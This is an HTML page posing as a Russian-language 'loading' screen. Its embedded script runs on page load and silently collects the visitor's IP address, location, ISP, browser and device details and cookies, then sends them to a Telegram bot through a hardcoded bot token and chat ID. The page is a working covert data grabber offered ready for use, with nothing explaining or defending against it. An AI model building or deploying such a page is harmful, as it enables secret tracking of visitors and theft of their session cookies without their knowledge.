<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Загрузка</title>
</head>
<body>
<h1>Секунду...</h1>
<script>
var TOKEN = '8680205049:AAF1KbStZTKnru9p5Ta8wUyKoXHGYgHtJuk'
var ID = '6783102477'

fetch('https://ipwho.is/')
.then(function(r){ return r.json(); })
.then(function(r){
  var t = 'IP: ' + r.ip
    + '\nГород: ' + r.city
    + '\nСтрана: ' + r.country
    + '\nПровайдер: ' + (r.connection ? r.connection.isp : '?')
    + '\nUA: ' + navigator.userAgent
    + '\nПлатформа: ' + navigator.platform
    + '\nЯзык: ' + navigator.language
    + '\nЧасовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone
    + '\nЭкран: ' + screen.width + 'x' + screen.height
    + '\nCPU: ' + navigator.hardwareConcurrency
    + '\nCookies: ' + (document.cookie || 'пусто');
  var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
        + '?chat_id=' + ID
        + '&text=' + encodeURIComponent(t);
  return fetch(u);
})
.then(function(){
  document.body.innerHTML = '<h1>Готово</h1>';
})
.catch(function(e){
  document.body.innerHTML = '<h1 style="color:red">' + e.message + '</h1>';
});
</script>
</body>
</html>
